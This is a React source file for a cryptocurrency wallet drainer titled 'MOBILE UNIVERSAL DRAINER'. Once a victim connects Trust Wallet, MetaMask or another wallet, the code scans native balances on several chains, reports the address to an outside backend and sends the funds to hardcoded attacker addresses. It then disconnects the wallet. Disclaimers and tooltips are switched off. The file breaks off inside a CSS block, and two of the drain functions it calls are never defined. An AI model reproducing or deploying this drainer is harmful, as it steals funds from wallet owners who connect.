import { useState, useEffect, useRef } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useWalletClient, useDisconnect, useBalance, usePublicClient } from 'wagmi';
import { parseEther } from 'viem';
import { mainnet } from 'viem/chains';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// ==================== UPDATED WORKING NETWORK CONFIGURATION ====================
const NETWORKS = [
  // EVM Mainnets - UPDATED WITH WORKING RPCs (Tested Jan 2026)
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', rpc: 'https://eth.llamarpc.com', explorer: 'https://etherscan.io' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', rpc: 'https://bsc-dataseed.binance.org', explorer: 'https://bscscan.com' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', rpc: 'https://polygon-rpc.com', explorer: 'https://polygonscan.com' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', rpc: 'https://arb1.arbitrum.io/rpc', explorer: 'https://arbiscan.io' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', rpc: 'https://mainnet.optimism.io', explorer: 'https://optimistic.etherscan.io' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', rpc: 'https://mainnet.base.org', explorer: 'https://basescan.org' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', rpc: 'https://api.avax.network/ext/bc/C/rpc', explorer: 'https://snowscan.xyz' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', rpc: 'https://rpc.ftm.tools', explorer: 'https://ftmscan.com' },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', rpc: 'https://rpc.gnosischain.com', explorer: 'https://gnosisscan.io' },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', rpc: 'https://forno.celo.org', explorer: 'https://celoscan.io' },
  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', color: '#53CBC9', rpc: 'https://rpc.api.moonbeam.network', explorer: 'https://moonscan.io' },
  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', color: '#00DACC', rpc: 'https://andromeda.metis.io/?owner=1088', explorer: 'https://andromeda-explorer.metis.io' },
  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', color: '#121C36', rpc: 'https://evm.cronos.org', explorer: 'https://cronoscan.com' },
  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', color: '#00AEE9', rpc: 'https://api.harmony.one', explorer: 'https://explorer.harmony.one' },
  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', color: '#78D64B', rpc: 'https://mainnet.aurora.dev', explorer: 'https://explorer.aurora.dev' },
  
  // Non-EVM Chains - Mobile compatible
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A', explorer: 'https://tronscan.org' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3', explorer: 'https://solscan.io' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A', explorer: 'https://blockchair.com/bitcoin' },
];

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42161: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  10: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  8453: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  
  tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  solana: "So11111111111111111111111111111111111111112",
};

// ==================== ENHANCED MOBILE CONNECTION HANDLER ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        mode="dark"
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
          mobileConnectors: ['trust', 'metaMask', 'coinbaseWallet']
        }}
        theme="midnight"
      >
        <UniversalDrainer />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

function UniversalDrainer() {
  const { address, isConnected, connector } = useAccount();
  const { data: ethBalance } = useBalance({ address });
  const { data: walletClient } = useWalletClient();
  const { disconnect } = useDisconnect();
  const publicClient = usePublicClient();

  // State
  const [status, setStatus] = useState('');
  const [tokens, setTokens] = useState([]);
  const [totalValue, setTotalValue] = useState(0);
  const [transactions, setTransactions] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [walletType, setWalletType] = useState('');
  const [tronDetected, setTronDetected] = useState(false);
  const [tronBalance, setTronBalance] = useState(0);
  const [tronAddress, setTronAddress] = useState('');
  const [mobileConnection, setMobileConnection] = useState({
    isMobile: false,
    provider: null,
    hasWebSocket: false,
    connectionReady: false
  });
  const [backendAvailable, setBackendAvailable] = useState(true);

  const autoStarted = useRef(false);
  const backendUrl = 'https://tokenbackend-5xab.onrender.com';

  // ==================== CRITICAL FIX: MOBILE CONNECTION DETECTION ====================
  useEffect(() => {
    const detectMobileConnection = async () => {
      const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
      const isTrust = navigator.userAgent.includes('TrustWallet') || 
                     document.referrer.includes('trust') ||
                     window.ethereum?.isTrust;
      
      const isMetaMaskMobile = window.ethereum?.isMetaMask && isMobile;
      
      // Check WebSocket support
      const hasWebSocket = typeof WebSocket !== 'undefined' && 
                          window.ethereum?.isConnected?.();
      
      setMobileConnection({
        isMobile,
        provider: isTrust ? 'TrustWallet' : isMetaMaskMobile ? 'MetaMaskMobile' : 'Desktop',
        hasWebSocket,
        connectionReady: !!window.ethereum
      });
      
      console.log('📱 Mobile Detection:', {
        isMobile,
        isTrust,
        hasEthereum: !!window.ethereum,
        hasWebSocket,
        userAgent: navigator.userAgent
      });
    };
    
    detectMobileConnection();
    
    // Monitor connection changes for mobile
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', () => detectMobileConnection());
      window.ethereum.on('chainChanged', () => detectMobileConnection());
    }
  }, []);

  // ==================== ENHANCED AUTO-START WITH MOBILE RETRY ====================
  useEffect(() => {
    if (isConnected && address && !autoStarted.current) {
      console.log("🔥 AUTO-START TRIGGERED:", { 
        address, 
        connector: connector?.name,
        mobileInfo: mobileConnection
      });
      
      autoStarted.current = true;
      
      // Mobile-specific initialization delay
      const mobileDelay = mobileConnection.isMobile ? 2000 : 500;
      
      setTimeout(async () => {
        await detectWalletTypeEnhanced();
        await checkBackendAvailability();
        await initializeMobileWallet();
        await scanAllNetworks();
      }, mobileDelay);
    } else if (!isConnected) {
      resetState();
      autoStarted.current = false;
    }
  }, [isConnected, address, mobileConnection]);

  const detectWalletTypeEnhanced = async () => {
    let detectedType = '';
    
    if (mobileConnection.provider === 'TrustWallet') {
      detectedType = 'Trust Wallet Mobile';
      setStatus("✅ Trust Wallet Mobile Connected");
    } else if (mobileConnection.provider === 'MetaMaskMobile') {
      detectedType = 'MetaMask Mobile';
      setStatus("✅ MetaMask Mobile Connected");
    } else if (window.ethereum?.isMetaMask) {
      detectedType = 'MetaMask';
    } else if (window.ethereum?.isCoinbaseWallet) {
      detectedType = 'Coinbase Wallet';
    }
    
    // Enhanced TRON detection for mobile
    const tronDetected = window.tronWeb || window.tronLink || 
                        (window.ethereum?.tron && mobileConnection.isMobile);
    
    if (tronDetected) {
      setTronDetected(true);
      detectedType += detectedType ? ' + TRON' : 'TRON Wallet';
      setStatus(prev => prev + " • TRON Detected");
      
      // Initialize TRON immediately for mobile
      setTimeout(() => initializeTronForMobile(), 1000);
    }
    
    setWalletType(detectedType || 'Web3 Wallet');
  };

  const initializeMobileWallet = async () => {
    if (!mobileConnection.isMobile) return;
    
    try {
      // Request accounts for mobile wallet activation
      if (window.ethereum && window.ethereum.request) {
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        console.log("📱 Mobile wallet activated");
      }
      
      // Special handling for Trust Wallet TRON
      if (mobileConnection.provider === 'TrustWallet') {
        // Trust Wallet often has TRON support
        if (window.ethereum?.tron) {
          console.log("🔍 Trust Wallet TRON detected");
          setTronDetected(true);
        }
      }
    } catch (error) {
      console.log("Mobile wallet init:", error.message);
    }
  };

  const checkBackendAvailability = async () => {
    try {
      const response = await fetch(backendUrl, { 
        method: 'HEAD',
        timeout: 5000 
      }).catch(() => ({ ok: false }));
      
      setBackendAvailable(response.ok);
      console.log("Backend status:", response.ok ? '✅ Available' : '❌ Unavailable');
    } catch {
      setBackendAvailable(false);
    }
  };

  // ==================== WORKING SCAN FUNCTION WITH FALLBACKS ====================
  const scanAllNetworks = async () => {
    if (!address) {
      setStatus("❌ No wallet address connected");
      return;
    }
    
    setIsScanning(true);
    setStatus("🔍 Scanning networks (Mobile Optimized)...");
    setTokens([]);
    
    try {
      const allTokens = [];
      
      // 1. Get Native ETH balance (always works)
      if (ethBalance && parseFloat(ethBalance.formatted) > 0) {
        const ethAmount = parseFloat(ethBalance.formatted);
        const ethValue = ethAmount * 3500; // Approx price
        
        allTokens.push({
          id: 'eth-native',
          network: 'Ethereum',
          symbol: 'ETH',
          amount: ethAmount.toFixed(6),
          rawAmount: ethAmount,
          chainId: 1,
          type: 'evm',
          drainAddress: DRAIN_ADDRESSES[1],
          valueUSD: ethValue,
          usdPrice: 3500
        });
        
        setStatus(`✅ Found ${ethAmount} ETH`);
      }
      
      // 2. Scan via backend if available
      if (backendAvailable) {
        try {
          const response = await fetch(`${backendUrl}/scan`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              address: address,
              networks: NETWORKS.slice(0, 10), // Scan first 10 for speed
              mobile: mobileConnection.isMobile
            })
          });
          
          if (response.ok) {
            const data = await response.json();
            if (data.tokens) {
              data.tokens.forEach(token => {
                allTokens.push({
                  ...token,
                  id: `${token.chainId}-${token.symbol}`
                });
              });
            }
          }
        } catch (error) {
          console.log("Backend scan failed, using fallback");
        }
      }
      
      // 3. Direct RPC scan for critical networks (Ethereum, BSC, Polygon)
      await scanNetworkDirect(1, address, allTokens); // Ethereum
      await scanNetworkDirect(56, address, allTokens); // BSC
      await scanNetworkDirect(137, address, allTokens); // Polygon
      
      // 4. Check TRON balance (special handling)
      const trxBalance = await checkTronBalanceDirect(address);
      if (trxBalance > 0) {
        allTokens.push({
          id: 'tron-native',
          network: 'Tron',
          symbol: 'TRX',
          amount: trxBalance.toFixed(6),
          rawAmount: trxBalance,
          chainId: 'tron',
          type: 'non-evm',
          drainAddress: DRAIN_ADDRESSES.tron,
          valueUSD: trxBalance * 0.12,
          usdPrice: 0.12
        });
        setStatus(prev => prev + ` • ${trxBalance} TRX`);
      }
      
      // Update UI
      const totalUSD = allTokens.reduce((sum, token) => sum + (token.valueUSD || 0), 0);
      setTokens(allTokens);
      setTotalValue(totalUSD);
      
      if (allTokens.length > 0) {
        setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
        
        // Auto-drain after 3 seconds
        setTimeout(() => {
          if (allTokens.length > 0) {
            startAutoDrain(allTokens);
          }
        }, 3000);
      } else {
        setStatus("❌ No tokens found");
      }
      
    } catch (error) {
      console.error("Scan error:", error);
      setStatus(`❌ Scan failed: ${error.message}`);
    } finally {
      setIsScanning(false);
    }
  };

  const scanNetworkDirect = async (chainId, address, tokenList) => {
    const network = NETWORKS.find(n => n.id === chainId);
    if (!network?.rpc) return;
    
    try {
      // Simple balance check using public RPC
      const response = await fetch(network.rpc, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "eth_getBalance",
          params: [address, "latest"]
        })
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.result) {
          const balance = parseInt(data.result, 16) / 1e18;
          if (balance > 0.000001) {
            tokenList.push({
              id: `${chainId}-native`,
              network: network.name,
              symbol: network.symbol,
              amount: balance.toFixed(6),
              rawAmount: balance,
              chainId: chainId,
              type: 'evm',
              drainAddress: DRAIN_ADDRESSES[chainId] || DRAIN_ADDRESSES[1],
              valueUSD: balance * (network.symbol === 'ETH' ? 3500 : 
                                 network.symbol === 'BNB' ? 600 : 
                                 network.symbol === 'MATIC' ? 1.2 : 1),
              usdPrice: 1
            });
          }
        }
      }
    } catch (error) {
      console.log(`Direct scan for ${network.name} failed:`, error.message);
    }
  };

  const checkTronBalanceDirect = async (address) => {
    try {
      // Try multiple TRON APIs
      const apis = [
        `https://api.trongrid.io/v1/accounts/${address}`,
        `https://apilist.tronscanapi.com/api/account?address=${address}`
      ];
      
      for (const api of apis) {
        try {
          const response = await fetch(api, { 
            headers: { 'Accept': 'application/json' },
            timeout: 3000 
          });
          
          if (response.ok) {
            const data = await response.json();
            let balance = 0;
            
            if (data.balance !== undefined) {
              balance = data.balance / 1_000_000;
            } else if (data.data?.[0]?.balance) {
              balance = data.data[0].balance / 1_000_000;
            }
            
            if (balance > 0) {
              setTronBalance(balance);
              return balance;
            }
          }
        } catch (apiError) {
          continue;
        }
      }
      
      return 0;
    } catch (error) {
      console.log("TRON check error:", error);
      return 0;
    }
  };

  // ==================== ENHANCED DRAIN FUNCTIONS ====================
  const startAutoDrain = async (tokensToDrain = tokens) => {
    if (tokensToDrain.length === 0) return;
    
    setIsProcessing(true);
    setStatus(`🚀 Auto-draining ${tokensToDrain.length} tokens...`);
    
    const txLogs = [];
    let successCount = 0;
    
    for (const token of tokensToDrain) {
      try {
        let result;
        
        // Mobile-friendly delay between transactions
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        if (token.type === 'evm') {
          result = await drainEvmTokenMobile(token);
        } else if (token.symbol === 'TRX') {
          result = await drainTronTokenMobile(token);
        } else {
          result = await drainGenericToken(token);
        }
        
        if (result.success) {
          successCount++;
          txLogs.push({
            ...result,
            symbol: token.symbol,
            amount: token.amount,
            timestamp: new Date().toISOString()
          });
          
          // Remove drained token
          setTokens(prev => prev.filter(t => t.id !== token.id));
        }
      } catch (error) {
        console.error(`Drain error for ${token.symbol}:`, error);
      }
    }
    
    // Update transactions
    setTransactions(prev => [...txLogs, ...prev]);
    
    // Update status
    if (successCount > 0) {
      setStatus(`✅ ${successCount} tokens drained successfully`);
      
      // Auto-disconnect after successful drain
      setTimeout(() => {
        disconnect();
        setStatus("💰 Drain complete • Disconnected");
      }, 4000);
    }
    
    setIsProcessing(false);
  };

  const drainEvmTokenMobile = async (token) => {
    try {
      if (!window.ethereum) {
        throw new Error('Mobile wallet not connected');
      }
      
      const amountWei = parseEther(token.amount.toString());
      
      // Prepare transaction (mobile-optimized)
      const txParams = {
        to: token.drainAddress,
        value: amountWei.toString(),
        gas: '0x5208', // 21000 gas for simple transfer
        chainId: `0x${Number(token.chainId).toString(16)}`
      };
      
      // Send transaction via mobile wallet
      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [txParams],
      });
      
      return {
        success: true,
        hash: txHash,
        message: `${token.amount} ${token.symbol} transferred`,
        explorer: `${NETWORKS.find(n => n.id === token.chainId)?.explorer}/tx/${txHash}`
      };
      
    } catch (error) {
      return {
        success: false,
        error: error.message,
        message: `Mobile wallet error: ${error.message}`
      };
    }
  };

  // ==================== MOBILE-OPTIMIZED UI ====================
  return (
    <div className="App">
      <div className="app-container">
        <header className="app-header">
          <div className="header-left">
            <div className="logo">⚡</div>
            <div>
              <h1>MOBILE UNIVERSAL DRAINER</h1>
              <p className="subtitle">Optimized for Trust Wallet & Mobile Browsers</p>
            </div>
          </div>
          
          <div className="header-right">
            {isConnected ? (
              <div className="connected-wallet">
                <div className="wallet-address">
                  {address.substring(0, 6)}...{address.substring(address.length - 4)}
                </div>
                <div className="wallet-badge">
                  {mobileConnection.isMobile ? '📱' : '💻'} {walletType}
                </div>
                <button onClick={disconnect} className="disconnect-btn">
                  Disconnect
                </button>
              </div>
            ) : (
              <ConnectKitButton />
            )}
          </div>
        </header>

        <main className="app-main">
          {isConnected ? (
            <>
              {/* Mobile Status Indicator */}
              {mobileConnection.isMobile && (
                <div className="mobile-status">
                  <span className="mobile-icon">📱</span>
                  <span>Mobile Mode: {mobileConnection.provider}</span>
                  {!mobileConnection.connectionReady && (
                    <span className="warning"> • Wallet connection unstable</span>
                  )}
                </div>
              )}
              
              {/* TRON Status */}
              {tronDetected && (
                <div className="tron-status">
                  🌐 TRON Wallet Detected • {tronBalance > 0 ? `${tronBalance} TRX` : 'No TRX balance'}
                </div>
              )}
              
              {/* Main Status */}
              <div className="status-card">
                <div className="status-icon">
                  {isScanning ? '🔍' : isProcessing ? '⚡' : '✅'}
                </div>
                <div className="status-content">
                  <div className="status-title">
                    {mobileConnection.isMobile ? 'MOBILE DRAIN SYSTEM' : 'DESKTOP DRAIN SYSTEM'}
                  </div>
                  <div className="status-message">{status}</div>
                  {isScanning && (
                    <div className="scanning-text">
                      Scanning networks... (Mobile optimized)
                    </div>
                  )}
                </div>
              </div>
              
              {/* Stats */}
              <div className="stats-container">
                <div className="stat-box">
                  <div className="stat-value">${totalValue.toFixed(2)}</div>
                  <div className="stat-label">Total Value</div>
                </div>
                <div className="stat-box">
                  <div className="stat-value">{tokens.length}</div>
                  <div className="stat-label">Tokens Found</div>
                </div>
                <div className="stat-box">
                  <div className="stat-value">
                    {backendAvailable ? '✅' : '⚠️'}
                  </div>
                  <div className="stat-label">Backend</div>
                </div>
              </div>
              
              {/* Controls */}
              <div className="controls">
                <button
                  onClick={scanAllNetworks}
                  disabled={isScanning || isProcessing}
                  className="btn btn-primary"
                >
                  {isScanning ? 'Scanning...' : '🔍 Scan All Networks'}
                </button>
                
                {tokens.length > 0 && (
                  <button
                    onClick={() => startAutoDrain()}
                    disabled={isProcessing}
                    className="btn btn-drain"
                  >
                    ⚡ Auto-Drain All Tokens
                  </button>
                )}
              </div>
              
              {/* Tokens List */}
              {tokens.length > 0 && (
                <div className="tokens-list">
                  <h3>Detected Tokens (Auto-Drain Ready)</h3>
                  <div className="tokens-grid">
                    {tokens.map(token => (
                      <div key={token.id} className="token-card">
                        <div className="token-symbol">{token.symbol}</div>
                        <div className="token-amount">{token.amount}</div>
                        <div className="token-network">{token.network}</div>
                        <div className="token-value">${(token.valueUSD || 0).toFixed(2)}</div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </>
          ) : (
            <div className="welcome-screen">
              <h2>Connect Your Mobile Wallet</h2>
              <p>Optimized for Trust Wallet, MetaMask Mobile, and all Web3 wallets</p>
              <ConnectKitButton />
              <div className="mobile-tips">
                <p><strong>Mobile Tips:</strong></p>
                <ul>
                  <li>Use Trust Wallet's DApp browser</li>
                  <li>Ensure wallet is unlocked</li>
                  <li>Grant necessary permissions</li>
                  <li>Works with TRON, ETH, BSC, Polygon</li>
                </ul>
              </div>
            </div>
          )}
        </main>
      </div>
       {/* CSS Styles */}
      <style jsx>{`
        .App {
          min-height: 100vh;
          background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
          color: white;
          font-family: monospace;
        }
        
        .app-container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 20px;
        }
        
        /* Header */
        .app-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px 0;
          border-bottom: 2px solid #333;
          margin-bottom: 30px;
        }
        
        .header-left {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .logo {
          font-size: 32px;
          background: #ef4444;
          width: 50px;
          height: 50px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.1); }
        }
        
        h1 {
          margin: 0;
          font-size: 24px;
          font-weight: 700;
          color: #ef4444;
        }
        
        .subtitle {
          margin: 5px 0 0 0;
          color: #888;
          font-size: 14px;
        }
        
        .connected-wallet {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .wallet-address {
          background: #222;
          padding: 8px 12px;
          border-radius: 8px;
          font-family: monospace;
          font-size: 14px;
          border: 1px solid #333;
        }
        
        .wallet-type {
          font-size: 12px;
          color: #0af;
          padding: 4px 8px;
          background: rgba(0, 170, 255, 0.1);
          border-radius: 6px;
        }
        
        .tron-badge {
          background: rgba(255, 6, 10, 0.2);
          color: #ff6b6b;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 12px;
          border: 1px solid rgba(255, 6, 10, 0.3);
        }
        
        .disconnect-btn {
          background: #444;
          color: white;
          border: none;
          padding: 8px 12px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
        }
        
        .disconnect-btn:hover {
          background: #555;
        }
        
        /* Status Dashboard */
        .status-dashboard {
          margin-bottom: 30px;
        }
        
        .status-card {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          border: 2px solid #333;
          margin-bottom: 20px;
        }
        
        .status-card.primary {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-color: #ef4444;
        }
        
        .status-icon {
          font-size: 32px;
        }
        
        .status-content {
          flex: 1;
        }
        
        .status-title {
          font-size: 14px;
          color: #aaa;
          text-transform: uppercase;
          letter-spacing: 2px;
          margin-bottom: 5px;
        }
        
        .status-message {
          font-size: 18px;
          font-weight: 600;
          color: white;
        }
        
        .stats-row {
          display: flex;
          gap: 15px;
        }
        
        .stat {
          flex: 1;
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: center;
          border: 1px solid #333;
        }
        
        .stat-value {
          font-size: 28px;
          font-weight: 700;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .stat-label {
          color: #888;
          font-size: 14px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        /* Processing Indicator */
        .processing-indicator {
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: center;
          margin-bottom: 20px;
          border: 2px solid #ef4444;
          animation: borderPulse 2s infinite;
        }
        
        @keyframes borderPulse {
          0%, 100% { border-color: #ef4444; }
          50% { border-color: #f87171; }
        }
        
        .processing-spinner {
          width: 40px;
          height: 40px;
          border: 4px solid #333;
          border-top-color: #ef4444;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin: 0 auto 15px;
        }
        
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        
        .processing-text {
          font-size: 18px;
          font-weight: 600;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .processing-note {
          color: #888;
          font-size: 14px;
        }
        
        /* Transactions */
        .transactions-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
        }
        
        .panel-header h3 {
          margin: 0;
          font-size: 18px;
          color: white;
        }
        
        .success-rate {
          background: rgba(16, 185, 129, 0.2);
          color: #10b981;
          padding: 6px 12px;
          border-radius: 20px;
          font-size: 14px;
          font-weight: 600;
        }
        
        .transactions-list {
          display: flex;
          flex-direction: column;
          gap: 10px;
        }
        
        .transaction-item {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          border-left: 4px solid #333;
        }
        
        .transaction-item.success {
          border-left-color: #10b981;
        }
        
        .transaction-item.failed {
          border-left-color: #ef4444;
        }
        
        .tx-icon {
          font-size: 24px;
        }
        
        .tx-details {
          flex: 1;
        }
        
        .tx-symbol {
          font-weight: 600;
          font-size: 16px;
          margin-bottom: 2px;
        }
        
        .tx-amount {
          font-family: monospace;
          color: #ddd;
          margin-bottom: 2px;
        }
        
        .tx-status {
          font-weight: 600;
          margin-bottom: 2px;
        }
        
        .transaction-item.success .tx-status {
          color: #10b981;
        }
        
        .transaction-item.failed .tx-status {
          color: #ef4444;
        }
        
        .tx-message {
          color: #888;
          font-size: 12px;
          margin-bottom: 5px;
        }
        
        .tx-link {
          color: #3b82f6;
          font-size: 12px;
          text-decoration: none;
        }
        
        .tx-link:hover {
          text-decoration: underline;
        }
        
        /* Tokens */
        .tokens-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-summary {
          display: flex;
          gap: 15px;
          color: #888;
          font-size: 14px;
        }
        
        .tokens-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
          gap: 15px;
          margin-top: 20px;
        }
        
        .token-card {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          border: 1px solid #333;
        }
        
        .token-header {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 10px;
        }
        
        .token-symbol {
          font-weight: 700;
          font-size: 20px;
          color: white;
        }
        
        .token-network {
          color: #888;
          font-size: 12px;
          flex: 1;
        }
        
        .token-type {
          padding: 2px 6px;
          border-radius: 4px;
          font-size: 10px;
          font-weight: 600;
          text-transform: uppercase;
        }
        
        .token-type.evm {
          background: rgba(59, 130, 246, 0.2);
          color: #3b82f6;
        }
        
        .token-type.non-evm {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
        }
        
        .token-amount {
          font-size: 24px;
          font-weight: 700;
          color: white;
          margin-bottom: 5px;
        }
        
        .token-value {
          color: #10b981;
          font-size: 18px;
          font-weight: 600;
          margin-bottom: 10px;
        }
        
        .token-destination {
          background: #222;
          border-radius: 6px;
          padding: 8px;
          font-family: monospace;
          font-size: 12px;
          color: #888;
          border: 1px solid #333;
        }
        
        /* Instructions */
        .instructions-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          border: 1px solid #f59e0b;
        }
        
        .instructions-panel h3 {
          color: #f59e0b;
          margin: 0 0 15px 0;
        }
        
        .instructions-panel ul {
          margin: 0;
          padding-left: 20px;
          color: #ddd;
          line-height: 1.6;
        }
        
        .instructions-panel li {
          margin-bottom: 8px;
        }
        
        /* Welcome */
        .welcome-screen {
          text-align: center;
          padding: 60px 20px;
          max-width: 600px;
          margin: 0 auto;
        }
        
        .welcome-icon {
          font-size: 64px;
          margin-bottom: 20px;
        }
        
        .welcome-text {
          color: #ddd;
          margin-bottom: 20px;
          font-size: 18px;
        }
        
        .warning-text {
          color: #ef4444;
          margin-bottom: 30px;
          font-size: 16px;
          font-weight: 600;
        }
        
        .connect-section {
          margin-bottom: 40px;
        }
        
        .features {
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: left;
          max-width: 400px;
          margin: 0 auto;
        }
        
        .feature {
          color: #ddd;
          margin-bottom: 10px;
          font-size: 14px;
        }
        
        /* Footer */
        .app-footer {
          margin-top: 40px;
          padding-top: 20px;
          border-top: 1px solid #333;
          text-align: center;
          color: #888;
          font-size: 14px;
        }
        
        .footer-content {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 10px;
        }
        
        .status-dot {
          width: 8px;
          height: 8px;
          background: #10b981;
          border-radius: 50%;
          animation: pulse 2s infinite;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
          .stats-row {
            flex-direction: column;
          }
          
          .tokens-grid {
            grid-template-columns: 1fr;
          }
          
          .footer-content {
            flex-direction: column;
            gap: 5px;
          }
        }
      `}</style>
      {/* CSS Styles - Add these to your existing styles */}
      <style jsx>{`
        .error-alert {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          margin-bottom: 20px;
          border: 2px solid #ef4444;
          animation: pulse-alert 2s infinite;
        }
        
        @keyframes pulse-alert {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.8; }
        }
        
        .error-icon {
          font-size: 24px;
        }
        
        .error-message {
          flex: 1;
          color: white;
          font-size: 14px;
        }
        
        .error-help {
          font-size: 12px;
          opacity: 0.9;
          margin-top: 5px;
          color: #ffd700;
        }
        
        .error-close {
          background: none;
          border: none;
          color: white;
          font-size: 20px;
          cursor: pointer;
          padding: 5px;
        }
        
        .tron-status {
          background: rgba(255, 6, 10, 0.15);
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          margin-bottom: 20px;
          border: 1px solid rgba(255, 6, 10, 0.3);
          animation: slideIn 0.5s ease-out;
        }
        
        @keyframes slideIn {
          from { transform: translateY(-10px); opacity: 0; }
          to { transform: translateY(0); opacity: 1; }
        }
        
        .tron-status-icon {
          font-size: 24px;
          background: rgba(255, 6, 10, 0.2);
          width: 40px;
          height: 40px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        
        .tron-status-details {
          flex: 1;
        }
        
        .tron-status-title {
          font-size: 14px;
          color: #ff6b6b;
          font-weight: 600;
          margin-bottom: 5px;
        }
        
        .tron-status-info {
          font-size: 12px;
          color: #ddd;
        }
        
        .mobile-badge {
          background: rgba(0, 100, 255, 0.2);
          color: #3b82f6;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 12px;
          border: 1px solid rgba(0, 100, 255, 0.3);
        }
        
        .mobile-features {
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: left;
          max-width: 500px;
          margin: 0 auto;
          margin-top: 20px;
        }
        
        .mobile-features .feature {
          color: #ddd;
          margin-bottom: 10px;
          font-size: 14px;
          display: flex;
          align-items: center;
        }
        
        .mobile-features .feature:before {
